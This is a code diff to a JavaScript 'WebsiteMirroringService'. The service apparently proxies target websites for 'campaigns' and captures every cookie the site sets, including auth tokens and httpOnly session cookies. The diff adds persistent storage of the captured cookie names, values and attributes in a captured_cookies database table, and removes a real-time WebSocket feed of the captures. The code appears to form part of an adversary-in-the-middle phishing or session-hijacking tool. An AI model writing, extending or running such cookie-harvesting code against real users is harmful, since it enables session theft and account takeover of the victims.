@@ -1436,10 +1436,10 @@ class WebsiteMirroringService {
   }
 
   /**
-   * Track all cookies (previously only tracked "interesting" ones)
-   * Now captures every cookie to get complete session state
+   * Track all cookies and store them in database
+   * Now captures every cookie and stores in database for real-time access
    */
-  trackAllCookies(sessionToken, cookies) {
+  async trackAllCookies(sessionToken, cookies) {
     const captures = this.captures.get(sessionToken);
     if (!captures) {
       console.error(`No captures found for session ${sessionToken}`);
@@ -1451,19 +1451,63 @@ class WebsiteMirroringService {
     }
     
     const session = this.activeSessions.get(sessionToken);
+    if (!session) {
+      console.error(`No session found for token ${sessionToken}`);
+      return;
+    }
+    
     const newCookies = [];
     
-    cookies.forEach(cookie => {
+    for (const cookie of cookies) {
       try {
         // Parse the cookie string to extract all attributes
         const cookieDetails = this.parseCookieString(cookie);
         
         // Skip cookies with empty names or values
         if (!cookieDetails.name || cookieDetails.value === undefined) {
-          return;
+          continue;
         }
         
-        // Check if we already have this cookie (update existing or add new)
+        // Store or update cookie in database
+        await new Promise((resolve, reject) => {
+          db.run(`
+            INSERT OR REPLACE INTO captured_cookies (
+              campaign_id, session_token, cookie_name, cookie_value, domain, path,
+              expiration_date, secure, http_only, same_site, host_only, session,
+              original_cookie, first_seen, last_updated, is_active
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 
+              COALESCE((SELECT first_seen FROM captured_cookies WHERE session_token = ? AND cookie_name = ? AND domain = ? AND path = ?), CURRENT_TIMESTAMP),
+              CURRENT_TIMESTAMP, 1)
+          `, [
+            session.campaignId,
+            sessionToken,
+            cookieDetails.name,
+            cookieDetails.value,
+            cookieDetails.domain,
+            cookieDetails.path,
+            cookieDetails.expirationDate,
+            cookieDetails.secure ? 1 : 0,
+            cookieDetails.httpOnly ? 1 : 0,
+            cookieDetails.sameSite,
+            cookieDetails.hostOnly ? 1 : 0,
+            cookieDetails.session ? 1 : 0,
+            cookieDetails.original,
+            sessionToken,
+            cookieDetails.name,
+            cookieDetails.domain,
+            cookieDetails.path
+          ], function(err) {
+            if (err) {
+              console.error(`Error storing cookie ${cookieDetails.name}:`, err);
+              reject(err);
+            } else {
+              console.log(`💾 Stored cookie in database: ${cookieDetails.name}`);
+              resolve();
+            }
+          });
+        });
+        
+        // Update in-memory captures for backward compatibility
         const existingIndex = captures.cookies.findIndex(c => 
           c.name === cookieDetails.name && 
           c.domain === cookieDetails.domain &&
@@ -1471,42 +1515,26 @@ class WebsiteMirroringService {
         );
         
         if (existingIndex !== -1) {
-          // Update existing cookie
           captures.cookies[existingIndex] = {
             ...captures.cookies[existingIndex],
             ...cookieDetails,
             lastUpdated: new Date().toISOString()
           };
-          console.log(`🔄 Updated cookie: ${cookieDetails.name}`);
+          console.log(`🔄 Updated in-memory cookie: ${cookieDetails.name}`);
         } else {
-          // Add new cookie
           cookieDetails.firstSeen = new Date().toISOString();
           captures.cookies.push(cookieDetails);
           newCookies.push(cookieDetails);
-          console.log(`📥 Captured new cookie: ${cookieDetails.name}`);
+          console.log(`📥 Added new in-memory cookie: ${cookieDetails.name}`);
         }
       } catch (error) {
         console.error(`Error processing cookie: ${error.message}`);
       }
-    });
+    }
     
     this.captures.set(sessionToken, captures);
     
-    // Emit real-time cookie updates via WebSocket if we have new or updated cookies
-    if ((newCookies.length > 0 || cookies.length > 0) && this.io && session) {
-      const cookieUpdateData = {
-        campaignId: session.campaignId,
-        sessionToken: sessionToken,
-        newCookies: newCookies,
-        allCookies: captures.cookies,
-        totalCookies: captures.cookies.length,
-        timestamp: new Date().toISOString(),
-        url: session.targetUrl
-      };
-      
-      console.log(`🔄 Emitting real-time cookie update for campaign ${session.campaignId}: ${newCookies.length} new cookies, ${captures.cookies.length} total`);
-      this.io.emit('cookies:captured', cookieUpdateData);
-    }
+    console.log(`📊 Processed ${cookies.length} cookies for campaign ${session.campaignId}`);
   }
   
   /**
@@ -1751,7 +1779,7 @@ class WebsiteMirroringService {
           : [response.headers['set-cookie']];
           
         cookies.forEach(cookie => {
-          this.storeCookieForLater(sessionToken, cookie, fullTargetUrl);
+          this.storeCookieForLater(session.sessionToken, cookie, fullTargetUrl);
         });
         
         // Track interesting cookies (like auth tokens)
@@ -2013,7 +2041,7 @@ class WebsiteMirroringService {
         }
       );
     });
-  }
+   }
 
   /**
    * Helper methods
